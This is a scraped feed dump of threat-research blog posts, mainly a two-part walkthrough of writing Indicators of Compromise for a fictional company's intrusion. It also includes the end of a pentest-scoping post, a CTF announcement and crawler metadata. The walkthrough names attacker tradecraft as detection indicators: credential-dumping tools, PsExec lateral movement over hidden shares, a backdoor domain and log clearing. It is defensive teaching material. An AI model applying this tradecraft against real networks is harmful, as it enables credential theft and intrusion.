recommend), then you should work with your penetration testing organization to determine the best physical location for the test to be performed. Generally, you'll want to do the internal penetration test from a network segment that has broad access to other portions of the internal network in order to get the best coverage from the test.</p> \n <p>Another \"Where\" to consider for remote testing is where the testers are physically located. When testers are in a different country than you, legal issues can arise with data provisioning and accessibility. Differences in language, culture, and time zones could also make coordination and interpretation of results more difficult.</p> \n <p> <b>When</b></p> \n <p>We recommend that most organizations get some sort of security assessment on an annual basis, but that security assessment does not necessarily need to be a penetration test (see <a href=\"https://www.mandiant.com/blog/penetration-testing-age/\">Penetration Testing Has Come Of Age - How to Take Your Security Program to the Next Level</a>). Larger organizations may have multiple assessments per year, each focused in a different area.</p> \n <p>Within the year, the timing of the penetration test is usually pretty flexible. You will want to make sure that the right people from your organization are available to initiate and manage the test - and to receive results and begin implementing changes. Based on your organization's change control procedures, you may need to work around system freezes or other activities. Testing in December can be difficult due to holidays and vacation, along with year-end closeout activities, especially for organizations in retail, e-commerce, and payment processing.</p> \n <p>If you have significant upgrades planned for the systems that will be tested, it is typically best to schedule the test for a month or two after the upgrades are due to be finished. This will allow some time for the inevitable delays in deploying the upgrades as well give the upgraded systems (and their administrators) a bit of time to \"settle in\" and get fully configured before being tested.</p> \n <p> <b>Who (part 2)</b></p> \n <p>The other \"who\" question to consider is who will perform the penetration test? We recommend considering the following when selecting a penetration testing provider:</p> \n <ol> \n  <li>What are the qualifications of the organization and the individuals who will be performing the test? What differentiates them from other providers?</li> \n  <li>To what degree does their testing rely on automated vulnerability scanners vs. hands on manual testing?</li> \n  <li>How well do they understand the threat actors that are relevant to your environment? How well are they able to emulate real world attacks?</li> \n  <li>What deliverables will you receive from the test? Are they primarily the output of an automated tool? Ask for samples.</li> \n  <li>Are they unbiased? Do they use penetration tests as a means to sell or resell other products and services?</li> \n </ol> \n <p>No doubt, there are other questions that you will want to consider when scoping a penetration test, but we hope that these will help you get started. If you'd like to read more about Mandiant's penetration testing (and other) services, you can do so <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\">here</a>. Of course, also feel free to <a href=\"http://www.mandiant.com/contact/\">contact us</a> if you'd like to talk about your situation and how Mandiant can best assess your organization's security.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 16 Sep 2014 20:49:32 +0000","feedId":1226,"bgimg":"","linkMd5":"55ee5bce61e2a33a227abdf117b176c5","bgimgJsdelivr":"","metaImg":"","author":"Chuck Willis","publishedOrCreatedDate":1598278264227},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"OpenIOC Series: Investigating with Indicators of Compromise (IOCs) –\nPart I","link":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>Written by Devon Kerr &amp; Will Gibb</i></p> \n <p>The <a target=\"_blank\" href=\"https://www.mandiant.com/blog/basics-series-openioc/\">Back to Basics: OpenIOC blog series</a> previously discussed how Indicators of Compromise (IOCs) can be used to codify information about malware or utilities and describe an attacker's methodology. Also touched on were the parts of an IOC, such as the metadata, references, and definition sections. This blog post will focus on writing IOCs by providing a common investigation scenario, following along with an incident response team as they investigate a compromise and assemble IOCs.</p> \n <p>Our scenario involves a fictional organization, \"Acme Widgets Co.\", which designs, manufactures and distributes widgets. Last week, this organization held a mandatory security-awareness training that provided attendees with an overview of common security topics including password strength, safe browsing habits, email phishing and the risks of social media. During the section on phishing, one employee expressed concern that he may have been phished recently. Bob Bobson, an administrator, indicated that some time back he'd received a strange email about a competitor's widget and was surprised that the PDF attachment wouldn't open. A member of the security operations staff, John Johnson, was present during the seminar and quickly initiated an investigation of Bob's system using the Mandiant <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline™</a> host investigation tool. John used Redline to create a portable collectors configured to obtain live response data from Bob's system which included file system metadata, the contents of the registry, event logs, web browser history, as well as service information.</p> \n <p>John ran the collectors on Bob's system and brought the data back to his analysis workstation for review. Through discussions with Bob, John learned that the suspicious e-mail likely arrived on October 13, 2013.</p> \n <p>After initial review of the evidence, John assembled the following timeline of suspicious activity on the system.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg\"><img width=\"746\" height=\"500\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg\" class=\" wp-image-5403 \" /></a>Table 1: Summary of significant artifacts\n <p>Based on this analysis, John pieced together a preliminary narrative: The attacker sent a spear-phishing email to Bob which contained a malicious PDF attachment, \"Ultrawidget.pdf\", which Bob saved to the desktop on October 10, 2013, at 20:19:07 UTC. Approximately five minutes later, at 20:24:44 UTC, the file \"C:WINDOWSSysWOW64acmCleanup.exe\" was created as well as a Run key used for persistence. These events were likely the result of Bob opening the PDF. John sent the PDF to a malware analyst to determine the nature of the exploit used to infect Bob's PC.</p> \n <p>The first IOC John writes describes the malware identified on Bob's PC, \"acmCleanup.exe\", as well as the malicious PDF. IOCs sometimes start out as rudimentary - looking for the known file hashes, filenames and persistence mechanisms of the malware identified. Here is what an initial IOC looks like:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png\"><img width=\"549\" height=\"163\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png\" class=\"size-full wp-image-5402\" /></a>Figure 1: Initial IOC for acmCleanup.exe (BACKDOOR)\n <p>As analysis continues, these IOCs are updated and improved - incorporating indicator terms from malware and intelligence analysis as well as being refined based on the environment. In this sense, the IOC is a living document. For example, additional analysis may reveal more registry key information, additional files which may be written to disk, or information for identifying the malware in memory. Here is the same IOC, after augmenting it with the results of malware analysis:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png\"><img width=\"544\" height=\"462\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png\" class=\"size-full wp-image-5401\" /></a>Figure 2: Augmented IOC for acmCleanup.exe (BACKDOOR)\n <p>The augmented IOC will continue to identify the exact malware discovered on Bob's PC. This improved IOC will also identify malware which has things in common with that backdoor:</p> \n <ul> \n  <li>Malware which uses the same Mutex, a process attribute that will prevent the machine from being infected multiple times with the same backdoor</li> \n  <li>Malware which performs DNS queries for the malicious domain \"23vsx.evil.com\"</li> \n  <li>Malware which has a specific set of import functions; in this case which correspond to reverse shell and keylogger functionality</li> \n </ul> \n <p>Beginning on October 11, the attacker accessed the system and executed the Windows command \"ipconfig\" at 20:24:00 UTC, resulting in the creation of a prefetch file. Approximately five minutes later, the attacker began uploading files to \"C:$RECYCLE.BIN\". Based on review of their MD5 hashes, three files (\"wce.exe\", \"getlsasrvaddr.exe\", \"update.exe\") were identified as known credential dumping utilities while others (\"filewalk32.exe\", \"rar.exe\") were tools for performing file system searches and creating WinRAR archives. These items should be recorded in an IOC, as a representation of an attacker's tools, techniques and procedures (TTPs). It is important to know that an attacker is likely to have interacted with many more systems than were infected with malware; for this reason it is crucial to look for evidence that an attacker has accessed systems. Some of the most common activities attackers perform on these systems include password-dumping, reconnaissance and data theft.</p> \n <p>Seeing that the attacker had staged file archives and utilities in the \"$Recycle.Bin\" folder, John also created an IOC to find artifacts present there. This IOC was designed to identify files in the root of the \"$Recycle.Bin\" directory; or to identify if a user (notably, the attacker) tried to access the \"$Recycle.Bin\" folder by manually typing it in the address bar of Explorer by checking TypedPaths in the Registry. This is an example of encapsulating an attacker's TTPs in an OpenIOC form.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png\"><img width=\"357\" height=\"281\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png\" class=\"size-full wp-image-5400\" /></a>Figure 3: IOC for Unusual Files in \"C:RECYCLER\" and \"C:$RECYCLE.BIN\" (Methodology)\n <p>On October 15, 2013, at 12:15:37 UTC, the Sysinternals PsExec utility was created in \"C:$RECYCLE.BIN\". Approximately four hours later, at 16:11:03 UTC, the attacker used the Internet Explorer browser to access text files located in \"C:$RECYCLE.BIN\". Between 16:11:03 UTC and 16:11:06 UTC, the attacker accessed two text files which were no longer present on the system. At 16:17:55 UTC, the attacker mounted the remote hidden share \"\\10.20.30.101C$\". At 16:20:29 UTC, the attacker executed the Windows \"tree\" command, resulting in the creation of a prefetch file, a command which produces a filesystem listing. At 17:37:37 UTC, the attacker created one WinRAR archive, \"C:$Recycle.Bina.rar\" which contained two text files, \"c.txt\" and \"a.txt\". These text files contained output from the Windows \"tree\" and \"ipconfig\" commands. No further evidence was present on the system. John noted that the earliest event log entries present on the system start approximately two minutes after the creation of \"a.rar\". It is likely that the attacker cleared the event logs before disconnecting from the system.</p> \n <p>John identified the lateral movement to the 10.20.30.101 host, from \"ACM-BOBBO\" through registry keys that recorded the mount of the hidden C$ share. By recording this type of artifact in an IOC, John will be able to quickly see if the attacker has pivoted to another part of the Acme Widgets Co. network when investigating 10.20.30.101. He included artifacts looking for other common hidden shares such as IPC$ and ADMIN$. The effectiveness of an IOC may be influenced by the environment the IOC was created for. This IOC, for example, may generate a significant number of false-positives in an environment where these hidden shares are legitimately used. At Acme Widgets Co., however, the use of hidden shares is considered highly suspicious.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-IOC-for-Lateral-Movement-Methodology-2.png\"><img width=\"360\" height=\"120\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-IOC-for-Lateral-Movement-Methodology-2.png\" alt=\"Figure 4 IOC for Lateral Movement (Methodology)\" class=\"size-full wp-image-5418\" /></a>Figure 4 IOC for Lateral Movement (Methodology)\n <p>At the end of the day, John authored three new IOCs based on his current investigation. He knows that if he records the artifacts he identified from his investigation into the \"ACM-BOBBO\" system, he can apply that knowledge to the investigation of the host at 10.20.30.101. Once he collects information on 10.20.30.101 with his Redline portable collector, he'll be able to match IOCs against the Live Response data, which will let him identify known artifacts quickly prior to beginning Live Response analysis. Although John is using these IOCs to search systems individually, these same IOCs could be used to search for evidence of attacker activity across the enterprise. Armed with this set of IOCs, John sets out to hunt for evil on the host at \"10.20.30.101\".</p> \n <p>Stay tuned for our next blog post, seeing how this investigation develops.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 16 Dec 2013 20:58:10 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg","linkMd5":"7630b59e5b18e448f20d4671a1b210ea","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn87@2020_2/2020/08/24/14-11-06-726_b1dc430a093bc8f6.webp","destWidth":829,"destHeight":556,"sourceBytes":139530,"destBytes":92458,"author":"Will Gibb","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn87@2020_2/2020/08/24/14-11-06-726_b1dc430a093bc8f6.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png":null,"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png":null,"https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn31@2020_3/2020/08/24/14-11-09-174_d22543ff46b58d7e.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-IOC-for-Lateral-Movement-Methodology-2.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn19@2020_5/2020/08/24/14-11-08-829_5ab514f6bc632eaa.webp"},"publishedOrCreatedDate":1598278264205},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Investigating with Indicators of Compromise (IOCs) – Part II","link":"http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>Written by Will Gibb &amp; Devon Kerr</i></p> \n <p>In our blog post <a target=\"_blank\" href=\"https://www.mandiant.com/blog/openioc-series-investigating-indicators-compromise-iocs-part/\">\"Investigating with Indicators of Compromise (IOCs) - Part I</a>,\" we presented a scenario involving the \"Acme Widgets Co.,\" a company investigating an intrusion, and its incident responder, John. John's next objective is to examine the system \"ACMWH-KIOSK\" for evidence of attacker activity. Using the IOCs containing the tactics, techniques and procedures (TTPs) he developed during the analysis of \"ACM-BOBBO,\" John identifies the following IOC hits:</p> \n <a target=\"_blank\" href=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg\"><img width=\"819\" height=\"616\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg\" class=\"size-full wp-image-5578\" /></a>Table 1: IOC hit summary\n <p>After reviewing IOC hits in <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline™</a>, John performs Live Response and put together the following timeline of suspicious activity on \"ACMWH-KIOSK\".</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-2-Summary-of-significant-artifacts1.jpg\"><img width=\"817\" height=\"593\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Table-2-Summary-of-significant-artifacts1.jpg\" class=\"size-full wp-image-5585\" /></a>Table 2: Summary of significant artifacts\n <p>John examines the timeline in order to surmise the following chain of activities:</p> \n <ul> \n  <li>On October 15, 2013, at approximately 16:17:56 UTC, the attacker performed a type 3 network logon, described <a target=\"_blank\">here</a>, to \"ACMWH-KIOSK\" from \"ACM-BOBBO\" using the ACME domain service account, \"backupDaily.\"</li> \n  <li>A few seconds later, the attacker copied two executables, \"acmCleanup.exe\" and \"msspcheck.exe,\" from \"ACM-BOBBO\" to \"C:$RECYCLE.BIN.\"</li> \n </ul> \n <p>By generating MD5 hashes of both files, John determines that \"acmCleanup.exe\" is identical to the similarly named file on \"ACM-BOBBO\", which means it won't require malware analysis. Since the MD5 hash of \"msspcheck.exe\" was not previously identified, John sends binary to a malware analyst, whose analysis reveals that \"msspcheck.exe\" is a variant of the \"acmCleanup.exe\" malware.</p> \n <ul> \n  <li>About a minute later, at 16:19:02 UTC, the attacker executed the Sysinternals PsExec remote command execution utility, which ran for approximately three minutes.</li> \n  <li>During this time period, event logs recorded the start and stop of the \"WCE SERVICE\" service, which corresponds to the execution of the Windows Credentials Editor (WCE).</li> \n </ul> \n <p>John can assume PsExec was used to execute WCE, which is reasonable given the timeline of events and artifacts present on the system.</p> \n <p>About seven minutes, later the registry recorded the modification of a Run key associated with persistence for \"msspcheck.exe.\" Finally, at 16:48:11 UTC, the attacker logged off from \"ACMWH-KIOSK\".</p> \n <p>John found no additional evidence of compromise. Since the IOCs are living documents, John's next step is to update his IOCs with relevant findings from his investigation of the kiosk system. John updates the \"acmCleanup.exe (BACKDOOR)\" IOC with information from the \"msspcheck.exe\" variant of the attacker's backdoor including:</p> \n <ul> \n  <li>File metadata like filename and MD5.</li> \n  <li>A uniquely named process handle discovered by John's malware analyst.</li> \n  <li>A prefetch entry for the \"msspcheck.exe\" binary.</li> \n  <li>Registry artifacts associated with persistence of \"msspcheck.exe.\"</li> \n </ul> \n <p>From there, John double-checks the uniqueness of the additional filename with some search engine queries. He can confirm that \"msspcheck.exe\" is a unique filename and update his \"acmCleanup.exe (BACKDOOR)\" IOC. By updating his existing IOC, John ensures that he will be able to identify evidence attributed to this specific variant of the backdoor.</p> \n <p>Changes to the original IOC have been indicated in green.</p> \n <p>The updated IOC can be seen below:</p> \n <a target=\"_blank\" href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png\"><img width=\"492\" height=\"591\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png\" class=\"size-full wp-image-5576\" /></a>Figure 1: Augmented IOC for acmCleanup.exe (BACKDOOR)\n <p>John needs additional information before he can start to act. He knows two things about the attacker that might be able to help him out:</p> \n <ul> \n  <li>The attacker is using a domain service account to perform network logons.</li> \n  <li>The attacker has been using WCE to obtain credentials and the \"WCE SERVICE\" service appears in event logs.</li> \n </ul> \n <p>John turns to his security event and incident management (SEIM) system, which aggregates logs from his domain controllers, enterprise antivirus and intrusion detection systems. A search of type 3 network logons using the \"backupDaily\" domain account turns up 23 different systems accessed using that account. John runs another query for the \"WCE SERVICE\" and sees that logs from 3 domain controllers contain that service event. John needs to look for IOCs across all Acme machines in a short period of time.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 06 Mar 2014 01:42:20 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg","linkMd5":"eae174c545cabc711744bf21e4bcf792","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn91@2020_5/2020/08/24/14-11-06-156_dd876d66f765ad6b.webp","destWidth":819,"destHeight":616,"sourceBytes":42408,"destBytes":25602,"author":"Will Gibb","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn91@2020_5/2020/08/24/14-11-06-156_dd876d66f765ad6b.webp","https://www.fireeye.com/content/dam/legacy/ammo/Table-2-Summary-of-significant-artifacts1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn72@2020_1/2020/08/24/14-11-08-817_c47504489b0b8296.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png":null},"publishedOrCreatedDate":1598278264203},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Announcing the Seventh Annual Flare-On Challenge","link":"http://www.fireeye.com/blog/threat-research/2020/08/announcing-the-seventh-annual-flare-on-challenge.html","description":"<p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7/FLARE-On%207.png\"\n    alt=\"\" class=\"float-right-small\" />The Front Line Applied Research\n  &amp; Expertise (FLARE) team is honored to announce that the popular\n  Flare-On challenge will return for a triumphant seventh year. Ongoing\n  global events proved no match against our passion for creating\n  challenging and fun puzzles to test and hone the skills of aspiring\n  and experienced reverse engineers.</p>\n <p>The contest will begin at 8:00 p.m. ET on Sept. 11, 2020. This is a\n  CTF-style challenge for all active and aspiring reverse engineers,\n  malware analysts and security professionals. The contest runs for six\n  full weeks and ends at 8:00 p.m. ET on Oct. 23, 2020.</p>\n <p>This year’s contest features a total of 11 challenges in a variety\n  of formats, including Windows, Linux, Python, VBA and .NET. This is\n  one of the only Windows-centric CTF contests out there and we have\n  crafted it to closely represent the challenges faced by our FLARE team\n  on a daily basis.</p>\n <p>If you are skilled and dedicated enough to complete the seventh\n  Flare-On challenge, you will receive a prize and recognition on the\n  Flare-On website for your accomplishment. Prize details will be\n  revealed later, but as always, it will be worthwhile swag to earn the\n  envy of your peers. In previous years we sent out belt buckles,\n  replica police badges, challenge coins, medals and huge pins.</p>\n <p>Check the <a href=\"http://flare-on.com/\">Flare-On website</a> for a\n  live countdown timer, to view the previous year’s winners, and to\n  download past challenges and solutions for practice. For official news\n  and information, we will be using the Twitter hashtag: #flareon7.</p>\n","descriptionType":"html","publishedDate":"Tue, 04 Aug 2020 15:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7/FLARE-On%207.png","linkMd5":"ac449f27211dfeb55051f9197589a47f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn3@2020_1/2020/08/24/14-11-06-444_ec75813c332a78f6.webp","destWidth":833,"destHeight":362,"sourceBytes":6031,"destBytes":7920,"author":"Nick Harbour","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7/FLARE-On%207.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn3@2020_1/2020/08/24/14-11-06-444_ec75813c332a78f6.webp"},"publishedOrCreatedDate":1598278264212}],"record":{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","feedId":1226,"fetchDate":"Mon, 24 Aug 2020 14:11:04 +0000","fetchMs":454,"handleMs":1627,"totalMs":28658,"newArticles":0,"totalArticles":100,"status":1,"type":0,"ip":"52.202.48.10","hostName":"us-53.herokuapp.com","requestId":"1aa2776cf8e24a30a42a811a1e78fb4f_1226","contentType":"application/atom+xml","totalBytes":15982258,"bgimgsTotal":60,"bgimgsGithubTotal":60,"articlesImgsTotal":372,"articlesImgsGithubTotal":366,"successGithubMap":{"myreaderx14":14,"myreaderx8":13,"myreaderx15":13,"myreaderx7":12,"myreaderx6":12,"myreaderx16":12,"myreaderx10":14,"myreaderx4":14,"myreaderx32":14,"myreaderx3":13,"myreaderx33":12,"myreaderx11":13,"myreaderx2":13,"myreaderx12":12,"myreaderx1":11,"myreaderx13":12,"myreaderx30":14,"myreaderx31":11,"myreaderx18":12,"myreaderx19":13,"myreaderx":12,"myreaderx25":13,"myreaderx27":11,"myreaderx21":12,"myreaderx22":13,"myreaderx23":11,"myreaderx24":13,"myreaderx5oss":13,"myreaderx29":13},"failGithubMap":{}},"feed":{"createdTime":"2020-08-24 21:31:27","updatedTime":"2020-08-24 21:31:27","id":1226,"name":"Threat Research","url":"http://www.fireeye.com/blog/feed","subscriber":null,"website":null,"icon":"http://www.fireeye.com/content/dam/fireeye-www/fw/images/fireeye.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn80@2020_1/2020/08/24/14-11-03-354_ef516858c02d2a62.png","description":"Technical review and analysis of malware and TTPs from FireEye engagements.","weekly":null,"link":"http://www.fireeye.com"},"noPictureArticleList":[{"createdTime":"2020-08-24 22:11:30","updatedTime":"2020-08-24 22:11:30","id":null,"feedId":1226,"linkMd5":"6a8824b4c0442d596b3eb7c51f97f663"},{"createdTime":"2020-08-24 22:11:30","updatedTime":"2020-08-24 22:11:30","id":null,"feedId":1226,"linkMd5":"7630b59e5b18e448f20d4671a1b210ea"},{"createdTime":"2020-08-24 22:11:30","updatedTime":"2020-08-24 22:11:30","id":null,"feedId":1226,"linkMd5":"eae174c545cabc711744bf21e4bcf792"}],"tmpCommonImgCdnBytes":3368610,"tmpBodyImgCdnBytes":12613648,"tmpBgImgCdnBytes":0,"extra4":{"start":1598278261944,"total":0,"statList":[{"spend":659,"msg":"获取xml内容"},{"spend":1627,"msg":"解释文章"},{"spend":1,"msg":"上传封面图到cdn"},{"spend":5,"msg":"修正封面图上传失败重新上传"},{"spend":22234,"msg":"正文链接上传到cdn"}]},"extra5":372,"extra6":372,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://zynamics.files.wordpress.com/2011/01/tree-venn.png","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":273,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:04","host":"us-030*","referer":"http://www.fireeye.com/blog/threat-research/2011/02/zynamics-memory-analysis.html","linkMd5ListStr":"1f2caa91e01abc44789c089c8b346516,1f2caa91e01abc44789c089c8b346516","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://zynamics.files.wordpress.com/2011/01/tree-venn.png","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":64,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:04","host":"us-021*","referer":"http://www.fireeye.com/blog/threat-research/2011/02/zynamics-memory-analysis.html","linkMd5ListStr":"1f2caa91e01abc44789c089c8b346516,1f2caa91e01abc44789c089c8b346516","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-2.JPG","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":87,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:12","host":"europe67*","referer":"http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","linkMd5ListStr":"fddeed9b0703e7f6f52cf35a37065473","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Probable%20APT28/figure-2.JPG","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":526,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:12","host":"us-001*","referer":"http://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html","linkMd5ListStr":"fddeed9b0703e7f6f52cf35a37065473","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":51,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:13","host":"us-020*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":43,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:13","host":"us-026*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":172,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:13","host":"europe65*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":57,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:14","host":"us-011*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":34,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:14","host":"us-55*","referer":"http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","linkMd5ListStr":"7630b59e5b18e448f20d4671a1b210ea","extra22GetBytesInfo":"2、Referer字段 ： http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html","extra23historyStatusCode":[403,403],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-Files-accessed-by-rar.exe-shown-in-WinPrefetchView.jpg","sourceStatusCode":403,"sourceBytes":0,"destBytes":0,"feedId":1226,"totalSpendMs":46,"convertSpendMs":0,"createdTime":"2020-08-24 22:11:15","host":"us-018*","referer":"http://www.fireeye.com/blog/threat-research/2013/01/carving-station-rar-files.html","linkMd5ListStr":"6a8824b4c0442d596b3eb7c51f97f663","extra22GetBytesInfo":"2、Referer字段 ： 